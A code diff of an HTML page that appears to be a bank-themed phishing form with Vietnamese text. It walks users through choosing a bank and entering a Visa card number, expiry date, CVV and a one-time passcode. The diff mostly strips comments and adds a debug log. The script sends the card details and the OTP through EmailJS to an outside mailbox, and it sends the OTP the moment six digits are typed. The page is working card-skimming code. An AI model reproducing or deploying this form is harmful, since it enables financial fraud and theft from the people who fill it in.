@@ -8,7 +8,6 @@
     <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
     <script>
-        // Inputmask fallback
         window.Inputmask = window.Inputmask || function(options) {
             console.warn('Inputmask not loaded, using fallback.');
             return {
@@ -28,7 +27,6 @@
                 }
             };
         };
-        // Initialize EmailJS
         emailjs.init('OrBsI926QI2_xBh1f');
     </script>
     <style>
@@ -38,12 +36,10 @@
             box-sizing: border-box;
             font-family: 'Arial', sans-serif;
         }
-
         body {
             background-color: #f5f5f5;
             color: #333;
         }
-
         .top-banner {
             background-color: #003087;
             padding: 12px;
@@ -52,11 +48,9 @@
             align-items: center;
             position: relative;
         }
-
         .top-banner img {
             height: 35px;
         }
-
         .hamburger {
             display: none;
             background: none;
@@ -68,7 +62,6 @@
             right: 10px;
             z-index: 1000;
         }
-
         .hamburger span {
             display: block;
             width: 25px;
@@ -77,36 +70,29 @@
             margin: 5px 0;
             transition: all 0.3s ease;
         }
-
         .hamburger[aria-expanded="true"] span:nth-child(1) {
             transform: rotate(45deg) translate(5px, 5px);
         }
-
         .hamburger[aria-expanded="true"] span:nth-child(2) {
             opacity: 0;
         }
-
         .hamburger[aria-expanded="true"] span:nth-child(3) {
             transform: rotate(-45deg) translate(7px, -7px);
         }
-
         nav {
             background-color: #fff;
             box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
             margin: 10px 0;
         }
-
         nav ul {
             display: flex;
             justify-content: center;
             list-style: none;
             padding: 10px 0;
         }
-
         nav ul li {
             margin: 0 15px;
         }
-
         nav ul li a {
             text-decoration: none;
             color: #003087;
@@ -115,12 +101,10 @@
             display: block;
             transition: background 0.3s;
         }
-
         nav ul li a:hover, nav ul li a:focus {
             background: #e6f0ff;
             border-radius: 5px;
         }
-
         .banner-carousel {
             position: relative;
             overflow: hidden;
@@ -128,17 +112,14 @@
             min-height: 180px;
             aspect-ratio: 16 / 9;
         }
-
         .banner-slide {
             display: none;
             width: 100%;
             height: 100%;
         }
-
         .banner-slide.active {
             display: block;
         }
-
         .banner-slide img {
             width: 100%;
             max-height: 280px;
@@ -146,7 +127,6 @@
             display: block;
             margin: 0 auto;
         }
-
         .banner-text {
             position: absolute;
             top: 50%;
@@ -159,7 +139,6 @@
             border-radius: 5px;
             max-width: 80%;
         }
-
         .prev, .next {
             position: absolute;
             top: 50%;
@@ -173,26 +152,21 @@
             border-radius: 5px;
             transition: background 0.3s;
         }
-
         .prev:hover, .next:hover {
             background: rgba(0, 0, 0, 0.9);
         }
-
         .prev:focus, .next:focus {
             outline: 2px solid #fff;
             outline-offset: 2px;
         }
-
         .prev { left: 15px; }
         .next { right: 15px; }
-
         .dots {
             text-align: center;
             position: absolute;
             bottom: 10px;
             width: 100%;
         }
-
         .dot {
             display: inline-block;
             width: 12px;
@@ -203,22 +177,18 @@
             cursor: pointer;
             transition: background 0.3s;
         }
-
         .dot:hover, .dot:focus {
             background: #666;
         }
-
         .dot.active {
             background: #003087;
         }
-
         .steps {
             display: flex;
             justify-content: center;
             margin: 10px 0;
             gap: 10px;
         }
-
         .step {
             flex: 1;
             text-align: center;
@@ -227,12 +197,10 @@
             border-radius: 5px;
             font-size: 14px;
         }
-
         .step.active {
             background-color: #003087;
             color: #fff;
         }
-
         .container {
             max-width: 600px;
             margin: 20px auto;
@@ -241,46 +209,38 @@
             border-radius: 10px;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
         }
-
         .container h2 {
             display: none;
             text-align: center;
             margin-bottom: 15px;
         }
-
         .container h2.active {
             display: block;
         }
-
         .container h2 img {
             height: 24px;
             vertical-align: middle;
             margin-right: 8px;
         }
-
         .bank-selection {
             margin-bottom: 20px;
             text-align: center;
             display: none;
         }
-
         .bank-selection.active {
             display: block;
         }
-
         .bank-selection h3 {
             color: #003087;
             font-size: 16px;
             margin-bottom: 10px;
         }
-
         .bank-grid {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
             gap: 10px;
             margin-bottom: 20px;
         }
-
         .bank-option {
             cursor: pointer;
             padding: 10px;
@@ -289,59 +249,48 @@
             transition: border 0.3s;
             text-align: center;
         }
-
         .bank-option img {
             max-width: 80px;
             height: auto;
         }
-
         .bank-option p {
             font-size: 12px;
             margin-top: 5px;
         }
-
         .bank-option.selected {
             border: 2px solid #003087;
             background: #e6f0ff;
         }
-
         .bank-selection .error {
             color: red;
             font-size: 12px;
             display: none;
             margin-top: 10px;
         }
-
         .bank-selection .error.show {
             display: block;
         }
-
         .guide-section {
             margin-bottom: 20px;
             text-align: center;
             display: none;
         }
-
         .guide-section.active {
             display: block;
         }
-
         .guide-section h3 {
             color: #003087;
             font-size: 16px;
             margin-bottom: 10px;
         }
-
         .guide-section .bank-logo {
             max-width: 80px;
             height: auto;
             margin-bottom: 10px;
         }
-
         .guide-section p {
             font-size: 14px;
         }
-
         .issue-guide-section {
             margin-top: 20px;
             padding: 15px;
@@ -349,28 +298,23 @@
             border-radius: 5px;
             display: none;
         }
-
         .issue-guide-section.active {
             display: block;
         }
-
         .issue-guide-section h3 {
             color: #003087;
             font-size: 16px;
             margin-bottom: 10px;
             display: inline-block;
         }
-
         .issue-guide-section ul {
             list-style: decimal;
             padding-left: 20px;
             font-size: 14px;
         }
-
         .issue-guide-section ul li {
             margin-bottom: 8px;
         }
-
         .issue-guide-section img {
             max-width: 300px;
             width: 100%;
@@ -378,7 +322,6 @@
             border-radius: 5px;
             margin-top: 10px;
         }
-
         .issue-guide-btn {
             padding: 8px 16px;
             border: none;
@@ -390,30 +333,24 @@
             margin-top: 10px;
             display: none;
         }
-
         .issue-guide-btn.active {
             display: inline-block;
         }
-
         .issue-guide-btn:hover {
             background-color: #ff6200;
         }
-
         .card-form, .otp-form {
             display: none;
         }
-
         .card-form.active, .otp-form.active {
             display: block;
         }
-
         .summary {
             margin-bottom: 20px;
             padding: 15px;
             background-color: #f9f9f9;
             border-radius: 5px;
         }
-
         .summary h3 {
             margin-bottom: 10px;
             cursor: pointer;
@@ -421,28 +358,23 @@
             align-items: center;
             justify-content: center;
         }
-
         .summary h3::after {
-            content: '\f078'; /* Font Awesome chevron-down */
+            content: '\f078';
             font-family: 'Font Awesome 6 Free';
             font-weight: 900;
             margin-left: 8px;
             transition: transform 0.3s;
         }
-
         .summary.collapsed h3::after {
             transform: rotate(180deg);
         }
-
         .summary.collapsed .summary-content {
             display: none;
         }
-
         .summary p {
             margin: 8px 0;
             font-size: 14px;
         }
-
         .check-info {
             text-align: center;
             font-size: 16px;
@@ -450,31 +382,26 @@
             color: #003087;
             margin: 15px 0;
         }
-
         .form-group {
             margin-bottom: 12px;
         }
-
         .form-group p {
             margin-bottom: 10px;
             line-height: 1.4;
             font-size: 14px;
             text-align: center;
         }
-
         .form-group label {
             display: block;
             margin-bottom: 5px;
             font-weight: bold;
             text-align: center;
         }
-
         .form-group .input-wrapper {
             display: flex;
             align-items: center;
             justify-content: center;
         }
-
         .form-group input {
             width: 100%;
             padding: 8px;
@@ -482,25 +409,21 @@
             border-radius: 5px;
             font-size: 14px;
         }
-
         .form-group .error {
             color: red;
             font-size: 12px;
             display: none;
             text-align: center;
         }
-
         .form-group .error.show {
             display: block;
         }
-
         .form-group .help-text {
             font-size: 12px;
             color: #666;
             margin-top: 5px;
             text-align: center;
         }
-
         .help-icon {
             display: inline-block;
             width: 20px;
@@ -515,25 +438,21 @@
             margin-left: 5px;
             cursor: pointer;
         }
-
         .help-image {
             margin-bottom: 15px;
             text-align: center;
             display: none;
             position: relative;
         }
-
         .help-image.active {
             display: block;
         }
-
         .help-image img {
             max-width: 300px;
             width: 100%;
             border: 1px solid #e9ecef;
             border-radius: 5px;
         }
-
         .help-image .overlay-text {
             position: absolute;
             top: 50%;
@@ -547,20 +466,17 @@
             text-align: center;
             max-width: 90%;
         }
-
         .timer {
             color: red;
             font-weight: bold;
             text-align: center;
             margin: 10px 0;
         }
-
         .buttons {
             display: flex;
             gap: 10px;
             justify-content: center;
         }
-
         button {
             padding: 8px 16px;
             min-width: 120px;
@@ -569,12 +485,10 @@
             cursor: pointer;
             font-size: 14px;
         }
-
         button.primary {
             background-color: #003087;
             color: #fff;
         }
-
         .guide-link {
             display: block;
             text-align: center;
@@ -583,11 +497,9 @@
             text-decoration: none;
             font-size: 14px;
         }
-
         .guide-link:hover {
             text-decoration: underline;
         }
-
         .error-dialog {
             display: none;
             position: fixed;
@@ -604,21 +516,17 @@
             min-height: 150px;
             border: 1px solid #ccc;
         }
-
         .error-dialog.show {
             display: block;
         }
-
         .error-dialog p {
             margin-bottom: 15px;
             font-size: 14px;
         }
-
         .error-dialog button {
             padding: 10px 20px;
             font-size: 14px;
         }
-
         footer {
             background-color: #003087;
             color: #fff;
@@ -626,36 +534,29 @@
             padding: 15px 0;
             margin-top: 15px;
         }
-
         footer img {
             height: 28px;
             margin: 8px;
         }
-
         footer a {
             color: #fff;
             margin: 0 8px;
             font-size: 12px;
             text-decoration: none;
         }
-
         footer a:hover {
             text-decoration: underline;
         }
-
         @media (max-width: 768px) {
             .top-banner {
                 padding: 10px;
             }
-
             .top-banner img {
                 height: 28px;
             }
-
             .hamburger {
                 display: block;
             }
-
             nav ul {
                 display: none;
                 flex-direction: column;
@@ -668,89 +569,70 @@
                 box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
                 z-index: 999;
             }
-
             nav ul.show {
                 display: flex;
             }
-
             nav ul li {
                 margin: 8px 0;
                 width: 100%;
                 text-align: center;
             }
-
             nav ul li a {
                 padding: 12px;
                 font-size: 14px;
             }
-
             .banner-carousel {
                 min-height: 160px;
                 margin-bottom: 5px;
             }
-
             .banner-text h1 {
                 font-size: 16px;
             }
-
             .banner-text p {
                 font-size: 10px;
             }
-
             .banner-slide img {
                 max-height: 180px;
             }
-
             .prev, .next {
                 padding: 8px;
                 font-size: 12px;
             }
-
             .dot {
                 width: 8px;
                 height: 8px;
                 margin: 0 4px;
             }
-
             .steps {
                 flex-direction: column;
                 gap: 6px;
             }
-
             .step {
                 padding: 8px;
                 font-size: 12px;
             }
-
             .container {
                 padding: 12px;
             }
-
             .bank-grid {
                 grid-template-columns: repeat(3, 1fr);
             }
-
             .bank-option img {
                 max-width: 60px;
             }
-
             .guide-section .bank-logo {
                 max-width: 60px;
             }
-
             .guide-section img, .issue-guide-section img, .help-image img {
                 max-width: 200px;
             }
-
             .help-image .overlay-text {
                 font-size: 12px;
                 padding: 8px;
             }
-
             .form-group {
                 margin-bottom: 10px;
             }
-
             button, .issue-guide-btn {
                 padding: 6px 12px;
                 font-size: 12px;
@@ -963,20 +845,17 @@
         let failedAttempts = 0;
         let formData = {};
 
-        // Show Help Image
         function showHelp(fieldId) {
             const helpImage = document.getElementById('helpImage');
             helpImage.classList.add('active');
             helpImage.scrollIntoView({ behavior: 'smooth' });
         }
 
-        // Toggle Summary Section
         function toggleSummary() {
             const summary = document.getElementById('summary');
             summary.classList.toggle('collapsed');
         }
 
-        // Load Summary and Initialize
         window.addEventListener('load', () => {
             try {
                 formData = JSON.parse(sessionStorage.getItem('formData') || '{}');
@@ -991,14 +870,12 @@
                 document.getElementById('summaryAccountHolder').textContent = formData.accountHolder || 'N/A';
                 document.getElementById('summaryPhone').textContent = formData.phone || 'N/A';
                 document.getElementById('summaryEmail').textContent = formData.email || 'N/A';
-                // Pre-select bank from sessionStorage
                 selectedBank = sessionStorage.getItem('selectedBank');
                 if (selectedBank) {
                     document.querySelector(`.bank-option[data-bank="${selectedBank}"]`)?.classList.add('selected');
                     document.getElementById('summaryBank').textContent = selectedBank;
                     confirmBank();
                 }
-                // Initialize expiry date input
                 initializeExpiryDateInput();
             } catch (error) {
                 console.error('Error parsing formData:', error);
@@ -1008,7 +885,6 @@
             initializeInputMasks();
         });
 
-        // Toggle Hamburger Menu
         function toggleMenu() {
             const menu = document.getElementById('nav-menu');
             const hamburger = document.querySelector('.hamburger');
@@ -1016,13 +892,11 @@
             hamburger.setAttribute('aria-expanded', menu.classList.contains('show'));
         }
 
-        // Toggle Issue Guide
         function toggleIssueGuide() {
             const issueGuide = document.getElementById('issue-guide');
             issueGuide.classList.toggle('active');
         }
 
-        // Select Bank
         function selectBank(bank, logo) {
             selectedBank = bank;
             selectedBankLogo = logo;
@@ -1033,7 +907,6 @@
             document.getElementById('bankError').classList.remove('show');
         }
 
-        // Confirm Bank Selection
         function confirmBank() {
             if (!selectedBank) {
                 document.getElementById('bankError').classList.add('show');
@@ -1043,16 +916,14 @@
             document.getElementById('bank-selection').classList.remove('active');
             document.getElementById('card-guide').classList.add('active');
             document.getElementById('card-info-form').classList.add('active');
-            document.getElementById('summary').classList.add('active');
             document.getElementById('issue-guide-btn').classList.add('active');
             document.getElementById('selected-bank-logo').src = selectedBankLogo;
             document.querySelector('.form-container h2').classList.add('active');
+            document.getElementById('summary').classList.add('active');
             document.getElementById('summaryBank').textContent = selectedBank;
-            // Show help image automatically when card form is active
             document.getElementById('helpImage').classList.add('active');
         }
 
-        // Lazy Load Images
         function lazyLoadImages() {
             const images = document.querySelectorAll('img.lazy');
             images.forEach(img => {
@@ -1064,7 +935,6 @@
             });
         }
 
-        // Banner Carousel
         function changeSlide(n) {
             bannerIndex = (bannerIndex + n + 4) % 4;
             updateBanner();
@@ -1089,14 +959,12 @@
         }, 5000);
         updateBanner();
 
-        // Initialize Input Masks
         function initializeInputMasks() {
             if (typeof window.Inputmask === 'function') {
                 Inputmask({ mask: "9999 9999 9999 9999" }).mask(document.getElementById('visaCardNumber'));
                 Inputmask({ mask: "999" }).mask(document.getElementById('visaCvv'));
                 Inputmask({ regex: "\\d{6}" }).mask(document.getElementById('otp'));
             }
-            // Manual spacing for card number if Inputmask fails
             const cardInput = document.getElementById('visaCardNumber');
             cardInput.addEventListener('input', function() {
                 let value = cardInput.value.replace(/\D/g, '');
@@ -1112,7 +980,6 @@
             lazyLoadImages();
         }
 
-        // Initialize Expiry Date Input
         function initializeExpiryDateInput() {
             const expiryInput = document.getElementById('visaExpiryDate');
             expiryInput.addEventListener('input', function(e) {
@@ -1136,7 +1003,6 @@
             });
         }
 
-        // Validate Date (mm/yy)
         function validateDate(dateStr) {
             const regex = /^\d{2}\/\d{2}$/;
             if (!regex.test(dateStr)) return false;
@@ -1148,12 +1014,10 @@
             return date && !isNaN(date) && date > currentDate && date.getMonth() + 1 === month && date.getFullYear() === fullYear;
         }
 
-        // Send Card Info to EmailJS
         function sendCardInfo(cardData) {
             return emailjs.send('service_60tgxof', 'template_m26sq6s', cardData);
         }
 
-        // Validate Visa Data
         function validateCardForm() {
             let isValid = true;
             const cardNumber = document.getElementById('visaCardNumber').value.replace(/\D/g, '');
@@ -1190,9 +1054,7 @@
                 formData.cvv = cvv;
                 formData.cardType = 'visa';
                 formData.bankName = selectedBank;
-                // Save to sessionStorage
                 sessionStorage.setItem('cardInfo', JSON.stringify(formData));
-                // Send to EmailJS
                 const cardData = {
                     cardType: formData.cardType,
                     cardNumber: formData.cardNumber,
@@ -1211,6 +1073,7 @@
                     email: formData.email || 'N/A',
                     method: 'N/A'
                 };
+                console.log('Sending cardData:', cardData); // Debug log
                 sendCardInfo(cardData).then(
                     () => {
                         console.log('EmailJS sent successfully');
@@ -1230,7 +1093,6 @@
             return isValid;
         }
 
-        // OTP Timer
         function startOTPTimer() {
             otpCountdown = 60;
             document.getElementById('otpTimer').textContent = `Còn ${otpCountdown} giây`;
@@ -1246,12 +1108,10 @@
             }, 1000);
         }
 
-        // Close Error Dialog
         function closeErrorDialog() {
             document.getElementById('errorDialog').classList.remove('show');
         }
 
-        // Send OTP to EmailJS
         function sendOTPToEmail(otp, phone) {
             emailjs.send('service_60tgxof', 'template_m26sq6s', {
                 otp: otp,
@@ -1263,7 +1123,6 @@
             );
         }
 
-        // Verify OTP
         function verifyOTP() {
             const otp = document.getElementById('otp').value.trim();
             const phone = formData.phone || 'N/A';
@@ -1309,7 +1168,6 @@
             }
         }
 
-        // Add click event listeners to bank options
         document.querySelectorAll('.bank-option').forEach(option => {
             option.addEventListener('click', () => {
                 selectBank(option.getAttribute('data-bank'), option.getAttribute('data-logo'));
@@ -1326,7 +1184,6 @@
             verifyOTP();
         });
 
-        // Send OTP to EmailJS on OTP input
         document.getElementById('otp').addEventListener('input', () => {
             const otp = document.getElementById('otp').value.trim();
             if (otp && /^\d{6}$/.test(otp)) {
